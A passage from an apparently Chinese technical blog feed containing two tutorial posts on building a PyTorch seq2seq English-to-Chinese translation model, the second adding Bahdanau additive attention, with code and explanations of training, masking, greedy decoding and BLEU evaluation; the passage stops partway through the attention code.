        counter = count_corpus(tokens)
        self._token_freqs = sorted(counter.items(), key=lambda x: x[1],
                                   reverse=True)
        # 未知词元的索引为0
        self.idx_to_token = ['&lt;unk>'] + reserved_tokens
        self.token_to_idx = &#123;token: idx
                             for idx, token in enumerate(self.idx_to_token)&#125;
        for token, freq in self._token_freqs:
            if freq &lt; min_freq:
                break
            if token not in self.token_to_idx:
                self.idx_to_token.append(token)
                self.token_to_idx[token] = len(self.idx_to_token) - 1

    def __len__(self):
        return len(self.idx_to_token)

    def __getitem__(self, tokens):
        if not isinstance(tokens, (list, tuple)):
            return self.token_to_idx.get(tokens, self.unk)
        return [self.__getitem__(token) for token in tokens]

    def to_tokens(self, indices):
        if not isinstance(indices, (list, tuple)):
            return self.idx_to_token[indices]
        return [self.idx_to_token[index] for index in indices]

    @property
    def unk(self):  # 未知词元的索引为0
        return 0

    @property
    def token_freqs(self):
        return self._token_freqs    
    



def truncate_pad(line, num_steps, padding_token):
    """截断或填充文本序列"""
    if len(line) > num_steps:
        return line[:num_steps]  # 截断
    return line + [padding_token] * (num_steps - len(line))  # 填充


def build_array(lines, vocab, num_steps):
    """将机器翻译的文本序列转换成小批量"""
    lines = [vocab[l] for l in lines] # 每行的token转换为其id
    lines = [l + [vocab['&lt;eos>']] for l in lines] # 每行的token后加上eos的id
    array = torch.tensor([truncate_pad(
        l, num_steps, vocab['&lt;pad>']) for l in lines])
    valid_len = (array != vocab['&lt;pad>']).type(torch.int32).sum(1)
    return array, valid_len

def load_array(data_arrays, batch_size, is_train=True):
    """构造一个PyTorch数据迭代器

    Defined in :numref:`sec_linear_concise`"""
    dataset = data.TensorDataset(*data_arrays)
    return data.DataLoader(dataset, batch_size, shuffle=is_train)

def load_data(batch_size, num_steps, num_examples=600):
    """返回翻译数据集的迭代器和词表"""

    text = read_data()

    source, target, src_line, tgt_line = tokenize(text)
    # 返回类似&#123;'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1&#125;的一个字典
    src_vocab = Vocab(source, min_freq=0,
                          reserved_tokens=['&lt;pad>', '&lt;bos>', '&lt;eos>'])
    tgt_vocab = Vocab(target, min_freq=0,
                          reserved_tokens=['&lt;pad>', '&lt;bos>', '&lt;eos>'])
    # 首先把每行的词转换为了其对应的id，然后给每一行的末尾添加token &lt;eos>, 然后根据num_steps，如果line长度不足，补&lt;pad>，如果长度超出，截断
    # 一种类型的输出是：
    # [
    #     [line0-char0-id, line0-char1-id, line0-char2-id, ...., eos-id],
    #     [line1-char0-id, line1-char1-id, line1-char2-id, ...., eos-id], 注意，最后的末尾可能没有eos
    #     .....
    # ]
    src_array, src_valid_len = build_array(source, src_vocab, num_steps)
    tgt_array, tgt_valid_len = build_array(target, tgt_vocab, num_steps)

    data_arrays = (src_array, src_valid_len, tgt_array, tgt_valid_len)
    data_iter = load_array(data_arrays, batch_size)
    return data_iter, src_vocab, tgt_vocab, src_line, tgt_line
  上面代码做了如下事情：


根据数据集的格式，读取每一行，只提前每行前面2个字符串。


然后我们对每一行进行文字切割，得到了一个二维列表，列表中的每一行又被分割为一个个中文文字和一个个英文的词，也就得到了一个个token。(特别注意，站在当前的时刻，这里的token和现在主流的大语言模型的token概念是一样的，但是不是一样的实现。)


由于模型不能直接处理文字，我们需要将文字转换为数字，那么直接的做法就是将一个个token编号即可，这个时候我们得到了词表（vocabulary）。


然后我们根据我们得到的词表，对原始数据集进行数字化，得到一个列表，列表中每个元素就是一个个token对应的索引。


最后得到：基于pytorch的DataLoader、原文词表、译文词表、原文文字列表、译文文字列表


  此外，在这里出现了几个在后面的大语言模型中也会出现的词：BOS/EOS。这两个分别代表一次对话的起始、结尾，这里直接记住就行。


搭建seq2seq训练框架
  首先引用一些包和一些辅助class
import os
import random
import torch
import math
from torch import nn
from torch.nn import functional as F
import numpy as np
import time
import visdom
import collections

import dataset
class Accumulator:
    """在n个变量上累加"""
    def __init__(self, n):
        """Defined in :numref:`sec_softmax_scratch`"""
        self.data = [0.0] * n

    def add(self, *args):
        self.data = [a + float(b) for a, b in zip(self.data, args)]

    def reset(self):
        self.data = [0.0] * len(self.data)

    def __getitem__(self, idx):
        return self.data[idx]
    
class Timer:
    """记录多次运行时间"""
    def __init__(self):
        """Defined in :numref:`subsec_linear_model`"""
        self.times = []
        self.start()

    def start(self):
        """启动计时器"""
        self.tik = time.time()

    def stop(self):
        """停止计时器并将时间记录在列表中"""
        self.times.append(time.time() - self.tik)
        return self.times[-1]

    def avg(self):
        """返回平均时间"""
        return sum(self.times) / len(self.times)

    def sum(self):
        """返回时间总和"""
        return sum(self.times)

    def cumsum(self):
        """返回累计时间"""
        return np.array(self.times).cumsum().tolist()
    
  然后我们根据编码器、解码器架构，设计seq2seq的网络主干
class Encoder(nn.Module):
    """编码器-解码器架构的基本编码器接口"""
    def __init__(self, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(Encoder, self).__init__(**kwargs)

    def forward(self, X, *args):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

class Decoder(nn.Module):
    """编码器-解码器架构的基本解码器接口

    Defined in :numref:`sec_encoder-decoder`"""
    def __init__(self, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(Decoder, self).__init__(**kwargs)

    def init_state(self, enc_outputs, *args):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

    def forward(self, X, state):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

class EncoderDecoder(nn.Module):
    """编码器-解码器架构的基类

    Defined in :numref:`sec_encoder-decoder`"""
    def __init__(self, encoder, decoder, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(EncoderDecoder, self).__init__(**kwargs)
        # 将传入的编码器实例赋值给类的属性
        self.encoder = encoder
        # 将传入的解码器实例赋值给类的属性
        self.decoder = decoder

    def forward(self, enc_X, dec_X, *args):
        # 调用编码器的前向传播方法，处理输入的编码器输入数据enc_X
        enc_outputs = self.encoder(enc_X, *args)
        # 调用解码器的init_state方法，根据编码器的输出初始化解码器的状态
        dec_state = self.decoder.init_state(enc_outputs, *args)
        # 调用解码器的前向传播方法，处理输入的解码器输入数据dec_X和初始化后的状态
        return self.decoder(dec_X, dec_state)
    
#@save
class Seq2SeqEncoder(Encoder):
    """用于序列到序列学习的循环神经网络编码器"""
    def __init__(self, vocab_size, embed_size, num_hiddens, num_layers,
                 dropout=0, **kwargs):
        super(Seq2SeqEncoder, self).__init__(**kwargs)
        # 嵌入层
        self.embedding = nn.Embedding(vocab_size, embed_size)
        self.rnn = nn.GRU(embed_size, num_hiddens, num_layers,
                          dropout=dropout)
        # self.lstm = nn.LSTM(embed_size, num_hiddens, num_layers)

    def forward(self, X, *args):
        # 输入X.shape = (batch_size,num_steps)
        # 输出'X'的形状：(batch_size,num_steps,embed_size)
        X = self.embedding(X)
        # 在循环神经网络模型中，第一个轴对应于时间步
        X = X.permute(1, 0, 2)
        # 如果未提及状态，则默认为0
        output, state = self.rnn(X)
        # output : 这个返回值是所有时间步的隐藏状态序列
        # output的形状:(num_steps,batch_size,num_hiddens)
        # hn (hidden) : 这是每一层rnn的最后一个时间步的隐藏状态
        # state的形状:(num_layers,batch_size,num_hiddens)
        return output, state

class Seq2SeqDecoder(Decoder):
    """用于序列到序列学习的循环神经网络解码器"""
    def __init__(self, vocab_size, embed_size, num_hiddens, num_layers,
                 dropout=0, **kwargs):
        super(Seq2SeqDecoder, self).__init__(**kwargs)
        self.embedding = nn.Embedding(vocab_size, embed_size)
        self.rnn = nn.GRU(embed_size + num_hiddens, num_hiddens, num_layers,
                          dropout=dropout)
        self.dense = nn.Linear(num_hiddens, vocab_size)

    def init_state(self, enc_outputs, *args):
        return enc_outputs[1]

    def forward(self, X, state):
        # 输出'X'的形状：(batch_size,num_steps,embed_size)
        X = self.embedding(X).permute(1, 0, 2)
        # 广播context，使其具有与X相同的num_steps
        context = state[-1].repeat(X.shape[0], 1, 1)
        X_and_context = torch.cat((X, context), 2)
        output, state = self.rnn(X_and_context, state)
        output = self.dense(output).permute(1, 0, 2)
        # output的形状:(batch_size,num_steps,vocab_size)
        # state的形状:(num_layers,batch_size,num_hiddens)
        return output, state
  我们结合上面的架构图对比着看，首先声明一下decoder/encoder的接口类：


声明了Encoder(nn.Module)，Encoder(nn.Module)其输入是原文，输出是中间状态。


声明了Decoder(nn.Module)，Decoder(nn.Module)的输入是BOS和中间状态，输出是译文。


声明了EncoderDecoder(nn.Module)类，串联Encoder(nn.Module)/Decoder(nn.Module)进行运行。


  然后声明实际的Seq2SeqEncoder部分：


声明了Seq2SeqEncoder(Encoder)，其是seq2seq编码器部分的实际定义，其输入是一串原文，然后经过了nn.Embedding，将输入的token序列转换为token-embedding，然后送入nn.GRU，得到了两个值：最后一层rnn的所有时间步的隐藏状态output（shape=num_steps,batch_size,num_hiddens），所有层rnn的最后一个时间步的隐藏状态h_n（shape=num_layers,batch_size,num_hiddens）


从Seq2SeqEncoder(Encoder)上面的分析可知：rnn的输出output代表的是每一个时间步，当前序列的总结信息，h_n encoder的隐藏态参数。


  最后声明实际的Seq2SeqDecoder部分：


声明了Seq2SeqDecoder(Decoder)，输入是：一个是bos，一个是Seq2SeqEncoder(Encoder)输出的隐藏态state(output,h_n)。首先将bos转换为embedding向量，然后将h_n的最后一个数据（也就是原文的总结，rnn最后一层最后一个时间步的隐藏态）和embedding组合在一起(注意：这里已经将原文的语义已经和bos输入混合在一起了)，和Seq2SeqEncoder(Encoder) state作为的隐藏状态初始值，一起传入rnn，然后经过nn.Linear的映射，得到了decoder的输出。


从Seq2SeqDecoder(Decoder)的分析可知，经过了nn.Linear映射之后，我们将decoder层的rnn的output转换为词表大小的一个向量，这个向量我们可以看做下一个字的分数Logits（注意：这个概念在后续大语言模型中，有比较大的作用）。


  这里，nn.RNN等pytorch层的输出，可以结合下面这个图来理解（图来自于参考文献相关链接）：

    
        
    
   
   下面给出的就是训练、预测部分的代码：
def try_gpu(i=0):
    """如果存在，则返回gpu(i)，否则返回cpu()

    Defined in :numref:`sec_use_gpu`"""
    if torch.cuda.device_count() >= i + 1:
        return torch.device(f'cuda:&#123;i&#125;')
    return torch.device('cpu')

def sequence_mask(X, valid_len, value=0):
    """在序列中屏蔽不相关的项"""
    maxlen = X.size(1)
    mask = torch.arange((maxlen), dtype=torch.float32,
                        device=X.device)[None, :] &lt; valid_len[:, None]
    X[~mask] = value
    return X

class MaskedSoftmaxCELoss(nn.CrossEntropyLoss):
    """带遮蔽的softmax交叉熵损失函数"""
    # pred的形状：(batch_size,num_steps,vocab_size)
    # label的形状：(batch_size,num_steps)
    # valid_len的形状：(batch_size,)
    def forward(self, pred, label, valid_len):
        weights = torch.ones_like(label)
        weights = sequence_mask(weights, valid_len)
        self.reduction='none'
        unweighted_loss = super(MaskedSoftmaxCELoss, self).forward(
            pred.permute(0, 2, 1), label)
        weighted_loss = (unweighted_loss * weights).mean(dim=1)
        return weighted_loss
    
def grad_clipping(net, theta):  #@save
    """裁剪梯度"""
    if isinstance(net, nn.Module):
        params = [p for p in net.parameters() if p.requires_grad]
    else:
        params = net.params
    norm = torch.sqrt(sum(torch.sum((p.grad ** 2)) for p in params))
    if norm > theta:
        for param in params:
            param.grad[:] *= theta / norm

def train_seq2seq(net, data_iter, lr, num_epochs, tgt_vocab, device):
    """训练序列到序列模型"""
    def xavier_init_weights(m):
        if type(m) == nn.Linear:
            nn.init.xavier_uniform_(m.weight)
        if type(m) == nn.GRU:
            for param in m._flat_weights_names:
                if "weight" in param:
                    nn.init.xavier_uniform_(m._parameters[param])

    net.apply(xavier_init_weights)
    net.to(device)
    optimizer = torch.optim.Adam(net.parameters(), lr=lr)
    loss = MaskedSoftmaxCELoss()
    net.train()
    vis = visdom.Visdom(env=u'test1', server="http://127.0.0.1", port=8097)
    animator = vis
    for epoch in range(num_epochs):
        timer = Timer()
        metric = Accumulator(2)  # 训练损失总和，词元数量
        for batch in data_iter:
            #清零（reset）优化器中的梯度缓存
            optimizer.zero_grad()
            # x.shape = [batch_size, num_steps]
            X, X_valid_len, Y, Y_valid_len = [x.to(device) for x in batch]
            # bos.shape = batch_size 个 bos-id
            bos = torch.tensor([tgt_vocab['&lt;bos>']] * Y.shape[0],
                          device=device).reshape(-1, 1)
            # dec_input.shape = (batch_size, num_steps)
            # 解码器的输入通常由序列的起始标志 bos 和目标序列（去掉末尾的部分 Y[:, :-1]）组成。
            dec_input = torch.cat([bos, Y[:, :-1]], 1)  # 强制教学
            # Y_hat的形状:(batch_size,num_steps,vocab_size)
            Y_hat, _ = net(X, dec_input, X_valid_len)
            l = loss(Y_hat, Y, Y_valid_len)
            l.sum().backward()      # 损失函数的标量进行“反向传播”
            grad_clipping(net, 1)
            num_tokens = Y_valid_len.sum()
            optimizer.step()
            with torch.no_grad():
                metric.add(l.sum(), num_tokens)

        if (epoch + 1) % 10 == 0:
            # print(predict('你是？'))
            # print(epoch)
            # animator.add(epoch + 1, )

            if epoch == 9:
                # 清空图表：使用空数组来替换现有内容
                vis.line(X=np.array([0]), Y=np.array([0]), win='train_ch8', update='replace')
            # _loss_val = l
            # _loss_val = _loss_val.cpu().sum().detach().numpy()
            vis.line(
                X=np.array([epoch + 1]),
                Y=[ metric[0] / metric[1]],
                win='train_ch8',
                update='append',
                opts=&#123;
                    'title': 'train_ch8',
                    'xlabel': 'epoch',
                    'ylabel': 'loss',
                    'linecolor': np.array([[0, 0, 255]]),  # 蓝色线条
                &#125;
            )
    print(f'loss &#123;metric[0] / metric[1]:.3f&#125;, &#123;metric[1] / timer.stop():.1f&#125; '
        f'tokens/sec on &#123;str(device)&#125;')
    torch.save(net.cpu().state_dict(), 'model_h.pt')  # [[6]]
    torch.save(net.cpu(), 'model.pt')  # [[6]]

def predict_seq2seq(net, src_sentence, src_vocab, tgt_vocab, num_steps,
                    device, save_attention_weights=False):
    """序列到序列模型的预测"""
    # 在预测时将net设置为评估模式
    net.eval()
    src_tokens = src_vocab[src_sentence.lower().split(' ')] + [
        src_vocab['&lt;eos>']]
    enc_valid_len = torch.tensor([len(src_tokens)], device=device)
    src_tokens = dataset.truncate_pad(src_tokens, num_steps, src_vocab['&lt;pad>'])
    # 添加批量轴
    enc_X = torch.unsqueeze(
        torch.tensor(src_tokens, dtype=torch.long, device=device), dim=0)
    enc_outputs = net.encoder(enc_X, enc_valid_len)
    dec_state = net.decoder.init_state(enc_outputs, enc_valid_len)
    # 添加批量轴
    dec_X = torch.unsqueeze(torch.tensor(
        [tgt_vocab['&lt;bos>']], dtype=torch.long, device=device), dim=0)
    output_seq, attention_weight_seq = [], []
    for _ in range(num_steps):
        Y, dec_state = net.decoder(dec_X, dec_state)
        # 我们使用具有预测最高可能性的词元，作为解码器在下一时间步的输入
        dec_X = Y.argmax(dim=2)
        pred = dec_X.squeeze(dim=0).type(torch.int32).item()
        # 保存注意力权重（稍后讨论）
        if save_attention_weights:
            attention_weight_seq.append(net.decoder.attention_weights)
        # 一旦序列结束词元被预测，输出序列的生成就完成了
        if pred == tgt_vocab['&lt;eos>']:
            break
        output_seq.append(pred)
    return ' '.join(tgt_vocab.to_tokens(output_seq)), attention_weight_seq


def bleu(pred_seq, label_seq, k):  #@save
    """计算BLEU"""
    pred_tokens, label_tokens = pred_seq.split(' '), [i for i in label_seq]
    len_pred, len_label = len(pred_tokens), len(label_tokens)
    score = math.exp(min(0, 1 - len_label / len_pred))
    for n in range(1, k + 1):
        num_matches, label_subs = 0, collections.defaultdict(int)
        for i in range(len_label - n + 1):
            label_subs[' '.join(label_tokens[i: i + n])] += 1
        for i in range(len_pred - n + 1):
            if label_subs[' '.join(pred_tokens[i: i + n])] > 0:
                num_matches += 1
                label_subs[' '.join(pred_tokens[i: i + n])] -= 1
        score *= math.pow(num_matches / (len_pred - n + 1), math.pow(0.5, n))
    return score
  这里首先要介绍一下其损失函数，核心两个：


通过交叉熵计算真实分布、预测分布的差异性，差异性越小，意味着我们的模型越好


由于我们是序列模型，可能涉及pad项，这些pad项的位置是无意义的，但是对模型有影响，我们需要再loss中剔除掉这种无意义的位置，我们用mask来屏蔽。


  然后训练过程的核心就是：从数据集中获取 训练数据、验证数据，通过训练数据得到预测数据，预测数据和验证数据进行loss计算，然后进行反向传播，找到loss最小化的方向，然后最小化loss，模型就会越来越好。
  然后就是介绍预测部分的内容：先将原文输入到seq的encoder，然后将bos序列 + seq的encoder的隐藏态传给seq的decoder，就可以得到下一个字的输出，直到我们遇到eos，预测结束。
  我们虽然预测完毕了，得到了原文对应的译文，但是我们需要一种方法来评估我们翻译的是不是正确，这里用的方法是bleu，它的作用就是评估输出序列与目标序列的精确度。
  最后，我们开始训练过程，注意，下面的例子是先进行训练，然后保存pt模型，然后加载模型进行预测推理。

if __name__ == '__main__':
    embed_size, num_hiddens, num_layers, dropout = 32, 32, 2, 0.1
    batch_size, num_steps = 64, 10
    lr, num_epochs, device = 0.005, 2000, try_gpu()
    # train_iter 每个迭代输出：(batch_size, num_steps)
    train_iter, src_vocab, tgt_vocab, source, target = dataset.load_data(batch_size, num_steps)
    encoder = Seq2SeqEncoder(len(src_vocab), embed_size, num_hiddens, num_layers,
                        dropout)
    decoder = Seq2SeqDecoder(len(tgt_vocab), embed_size, num_hiddens, num_layers,
                            dropout)
    net = EncoderDecoder(encoder, decoder)

    is_train = False
    if is_train:
        train_seq2seq(net, train_iter, lr, num_epochs, tgt_vocab, device)

    else:
        state_dict = torch.load('model_h.pt')
        net.load_state_dict(state_dict)
        net.to(device)
        C = 0
        C1 = 0
        for i in range(2000):
            # print(source[i])
            # print(target[i])
            translation, attention_weight_seq = predict_seq2seq(
                net, source[i], src_vocab, tgt_vocab, num_steps, device)
            
            score = bleu(translation, target[i], k=2)
            if score > 0.0:
                C = C + 1
                if score > 0.8:
                    C1 = C1 + 1
                print(f'&#123;source[i]&#125; => &#123;translation&#125;, bleu &#123;score:.3f&#125;')

        print(f'Counter(bleu > 0) = &#123;C&#125;')
        print(f'Valid-Counter(bleu > 0.8) = &#123;C1&#125;')

    
        
    
   

    
        
    
   
  从上面的图可以看到，这个模型有一定的翻译效果。
  此外，我这里计算了非零的bleu以及大于0.8的bleu的个数，这个个数勉强可以评估，我们对现在这个seq2seq模型优化的效果，为后面的文章提前做一些准备工作。




后记

  本文出现了bos/eos/logits等一些概念的应用，这些应用在大语言模型中也有体现。
  此外，我们从当前的模型结构也可以知道，当前并没有解决输入序列过长时，序列前面部分信息可能丢失，序列中的重点信息没有动态突出的问题。
参考文献


https://zh.d2l.ai/chapter_recurrent-modern/encoder-decoder.html


https://zh.d2l.ai/chapter_recurrent-modern/seq2seq.html


https://www.geeksforgeeks.org/nlp/stacked-rnns-in-nlp/


https://docs.pytorch.org/docs/stable/generated/torch.nn.RNN.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>seq2seq</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(六)---带注意力机制的seq2seq实例与测试(Bahdanau Attention)</title>
    <url>/2025/11/02/blog_idx_143/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

   本文是这个系列第六篇，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》 https://www.cnblogs.com/Iflyinsky/p/18717317


《大模型基础补全计划(二)—词嵌入(word embedding) 》 https://www.cnblogs.com/Iflyinsky/p/18775451


《大模型基础补全计划(三)—RNN实例与测试》 https://www.cnblogs.com/Iflyinsky/p/18967569


《大模型基础补全计划(四)—LSTM的实例与测试(RNN的改进)》 https://www.cnblogs.com/Iflyinsky/p/19091089


《大模型基础补全计划(五)—seq2seq实例与测试(编码器、解码器架构)》 https://www.cnblogs.com/Iflyinsky/p/19150535


  本文，介绍一下注意力机制，并在上文的机翻模型seq2seq的实例中添加一个简单的注意力机制，并看看模型效果是否有提升。




注意力机制（Bahdanau Attention）

   举一个例子：在日常生活中，比如我们看一幅黑白画（画中有一个红色的苹果，其他的都是黑白的物体，例如香蕉），这个时候我们无意识的看一眼画，很有可能第一个关注的就是这个红色的苹果，但是我有意识的控制眼睛集中去看香蕉，这个时候我关注的就是香蕉。
  在上面的例子中，我们的注意力，最开始是无意识的看苹果，后面有意识的注意香蕉，这里面的区别就是我们在这个动作里面加了：意识。当加了意识后，我们就可以有选择的根据条件来关注这幅画的我想关注的地方。
  然后我们可以对上面的现象进行建模：$R=Attention(Q,K)*V$，这里我们将Attention当作意识，V当作黑白画的特征，Q是画中是什么？K是V的标签（你可以把K当作是V有关联的部分，不同的K，对应的不同的V），如果没有Attention，R就是苹果，有了Attention，R就可以是香蕉。
  我们回头想一想上一篇文的seq2seq中，我们的encoder的output是最后一层rnn的所有时间步的隐藏状态（num_steps,batch_size,num_hiddens），这里包含了我们的序列数据在不同时间步的特征变化，当我们在做decoder的时候，我们是拿着这个encoder的最后一层rnn的最后一个时间步的隐藏状态（1,batch_size,num_hiddens）来作为context的，是一个固定的值，这样有几个问题：


对于长序列来说，context可能丢失信息。


我们从固定context中解码信息，导致了我们对序列在特定解码步骤中，对context关注重点是一样的。


  针对上面seq2seq的问题，Bahdanau设计了一种模型，可以解决我们遇到的问题，其定义如下：$$c_{t’} = \sum_{t=1}^{T} \alpha(s_{t’-1}, h_{t})h_{t}$$，看公式我们可以知道，这里定义了Q（decoder的上一次隐藏态$s_{t’-1}$）/K（encoder的output的部分$h_{t}$）/V（encoder的output的部分$h_{t}$）三个概念，含义就是通过Q+K来计算一个权重矩阵W（通过softmax归一化），然后然后将W和V进行计算，得到了我们通过W关注到的新的$V_{new}$，这里的W就是我们的注意力矩阵，代表我们关注V中的哪些部分。整个计算过程，就相当于我们生成了新成context具备了注意力机制。




带注意力机制的seq2seq  英文翻译中文  的实例

   下面的代码和上一篇文章的代码只有decoder部分有比较大的差别，其他的基本类似。如dataset部分的内容，请参考上一篇文章。


seq2seq完整代码如下
  
import os
import random
import torch
import math
from torch import nn
from torch.nn import functional as F
import numpy as np
import time
import visdom
import collections

import dataset
class Accumulator:
    """在n个变量上累加"""
    def __init__(self, n):
        """Defined in :numref:`sec_softmax_scratch`"""
        self.data = [0.0] * n

    def add(self, *args):
        self.data = [a + float(b) for a, b in zip(self.data, args)]

    def reset(self):
        self.data = [0.0] * len(self.data)

    def __getitem__(self, idx):
        return self.data[idx]
    
class Timer:
    """记录多次运行时间"""
    def __init__(self):
        """Defined in :numref:`subsec_linear_model`"""
        self.times = []
        self.start()

    def start(self):
        """启动计时器"""
        self.tik = time.time()

    def stop(self):
        """停止计时器并将时间记录在列表中"""
        self.times.append(time.time() - self.tik)
        return self.times[-1]

    def avg(self):
        """返回平均时间"""
        return sum(self.times) / len(self.times)

    def sum(self):
        """返回时间总和"""
        return sum(self.times)

    def cumsum(self):
        """返回累计时间"""
        return np.array(self.times).cumsum().tolist()
    
class Encoder(nn.Module):
    """编码器-解码器架构的基本编码器接口"""
    def __init__(self, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(Encoder, self).__init__(**kwargs)

    def forward(self, X, *args):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

class Decoder(nn.Module):
    """编码器-解码器架构的基本解码器接口

    Defined in :numref:`sec_encoder-decoder`"""
    def __init__(self, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(Decoder, self).__init__(**kwargs)

    def init_state(self, enc_outputs, *args):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

    def forward(self, X, state):
        # 抛出未实现错误，意味着该方法需要在子类中具体实现
        raise NotImplementedError

class EncoderDecoder(nn.Module):
    """编码器-解码器架构的基类

    Defined in :numref:`sec_encoder-decoder`"""
    def __init__(self, encoder, decoder, **kwargs):
        # 调用父类nn.Module的构造函数，确保正确初始化
        super(EncoderDecoder, self).__init__(**kwargs)
        # 将传入的编码器实例赋值给类的属性
        self.encoder = encoder
        # 将传入的解码器实例赋值给类的属性
        self.decoder = decoder

    def forward(self, enc_X, dec_X, enc_X_valid_len, *args):
        # 调用编码器的前向传播方法，处理输入的编码器输入数据enc_X
        enc_outputs = self.encoder(enc_X, *args)
        # 调用解码器的init_state方法，根据编码器的输出初始化解码器的状态
        dec_state = self.decoder.init_state(enc_outputs, enc_X_valid_len)
        # 调用解码器的前向传播方法，处理输入的解码器输入数据dec_X和初始化后的状态
        return self.decoder(dec_X, dec_state)
    

def masked_softmax(X, valid_lens):  #@save
    """
    执行带掩码的 Softmax 操作。
    
    参数:
        X (torch.Tensor): 待 Softmax 的张量，通常是注意力机制中的“分数”（scores）。
                          其形状通常为 (批量大小, 查询数量/序列长度, 键值对数量/序列长度)。
        valid_lens (torch.Tensor): 序列的有效长度张量。
                                   形状可以是 (批量大小,) 或 (批量大小, 键值对数量)。
                                   用于指示每个序列的哪个部分是有效的（非填充）。
    
    返回:
        torch.Tensor: 经过 Softmax 归一化且填充部分被忽略的概率分布张量。
    """
    
    # 辅助函数：创建一个序列掩码，并用特定值覆盖被掩码（填充）的元素
    def _sequence_mask(X, valid_len, value=0):
        """
        根据有效长度（valid_len）创建掩码，并应用于张量 X。
        
        参数:
            X (torch.Tensor): 形状为 (批量大小 * 查询数量, 最大长度) 的张量。
            valid_len (torch.Tensor): 形状为 (批量大小 * 查询数量,) 的有效长度向量。
            value (float): 用于替换被掩码元素的填充值。
            
        返回:
            torch.Tensor: 被填充值覆盖后的张量 X。
        """
        # 获取序列的最大长度（张量的第二个维度）
        maxlen = X.size(1)
        
        # 核心掩码逻辑：
        # 1. torch.arange((maxlen), ...) 创建一个从 0 到 maxlen-1 的序列（代表时间步索引）
        # 2. [None, :] 使其形状变为 (1, maxlen)，用于广播
        # 3. valid_len[:, None] 使有效长度形状变为 (批量大小 * 查询数量, 1)，用于广播
        # 4. &lt; 比较操作：当索引 &lt; 有效长度时，结果为 True（有效元素），否则为 False（填充元素）
        mask = torch.arange((maxlen), dtype=torch.float32,
                            device=X.device)[None, :] &lt; valid_len[:, None]
        
        # 逻辑非 ~mask 得到填充部分的掩码（True 表示填充部分）
        # 使用填充值（value，通常是 -1e6）覆盖填充元素
        X[~mask] = value
        return X

    # 1. 处理无需掩码的情况
    if valid_lens is None:
        # 如果未提供有效长度，则执行标准 Softmax
        return nn.functional.softmax(X, dim=-1)
    
    # 2. 处理需要掩码的情况
    else:
        # 备份原始形状，用于后续重塑
        shape = X.shape
        
        # 统一 valid_lens 的形状，使其与 X 的前两个维度相匹配
        if valid_lens.dim() == 1:
            # 适用于批量中每个序列只有一个有效长度的情况（例如，K-V 序列是等长的）
            # 将 valid_lens 重复 shape[1] 次，匹配 X 的查询/序列长度维度
            valid_lens = torch.repeat_interleave(valid_lens, shape[1])
        else:
            # 适用于每个查询-键值对的有效长度都不同的情况
            # 将 2D 张量展平为 1D 向量
            valid_lens = valid_lens.reshape(-1)
            
        # 预处理 Softmax 输入：将 X 调整为 2D 矩阵 (批量*查询数量, 键值对数量)
        # 并在最后一个轴（Softmax 轴）上，用一个非常大的负值替换被掩码的元素
        # Softmax 时 exp(-1e6) 趋近于 0，从而忽略填充部分。
        X = _sequence_mask(X.reshape(-1, shape[-1]), valid_lens, value=-1e6)
        
        # 对经过掩码处理的 X 执行 Softmax
        # 结果张量 X 被重塑回原始的 3D 形状 (批量大小, 查询数量, 键值对数量)
        # 并在最后一个维度（dim=-1）上进行归一化，得到注意力权重
        return nn.functional.softmax(X.reshape(shape), dim=-1)
    

    
class AdditiveAttention(nn.Module):  #@save
    """
    加性注意力（Additive Attention）模块。
    通过将 Query 和 Key 投影到相同的维度后相加，再通过 tanh 激活和线性层计算注意力分数。
    
    公式核心：score(Q, K) = w_v^T * tanh(W_q*Q + W_k*K)
    """
    
    def __init__(self, num_hiddens, dropout, **kwargs):
        """
        初始化加性注意力模块。
        
        参数:
            num_hiddens (int): 隐藏层维度，Q 和 K 投影后的维度。
            dropout (float): Dropout 率。
        """
        super(AdditiveAttention, self).__init__(**kwargs)
        
        # W_k：将 Key (K) 向量投影到 num_hiddens 维度的线性层
        # 使用 nn.LazyLinear 延迟初始化，直到第一次 forward 传入 K 的维度
        self.W_k = nn.LazyLinear(num_hiddens, bias=False)
        
        # W_q：将 Query (Q) 向量投影到 num_hiddens 维度的线性层
        # 使用 nn.LazyLinear 延迟初始化
        self.W_q = nn.LazyLinear(num_hiddens, bias=False)
        
        # w_v：将激活后的特征向量 (W_q*Q + W_k*K) 投影成一个标量分数（维度为 1）
        # 使用 nn.LazyLinear 延迟初始化
        self.w_v = nn.LazyLinear(1, bias=False)
        
        # Dropout 层，用于防止过拟合
        self.dropout = nn.Dropout(dropout)

    def forward(self, queries, keys, values, valid_lens):
        """
        执行前向传播计算。
        
        参数:
            queries (torch.Tensor): 查询向量 Q。形状通常为 (批量大小, 查询数量, 查询维度)。
            keys (torch.Tensor): 键向量 K。形状通常为 (批量大小, 键值对数量, 键维度)。
            values (torch.Tensor): 值向量 V。形状通常为 (批量大小, 键值对数量, 值维度)。
            valid_lens (torch.Tensor): 键值对序列的有效长度，用于掩盖填充部分。
            
        返回:
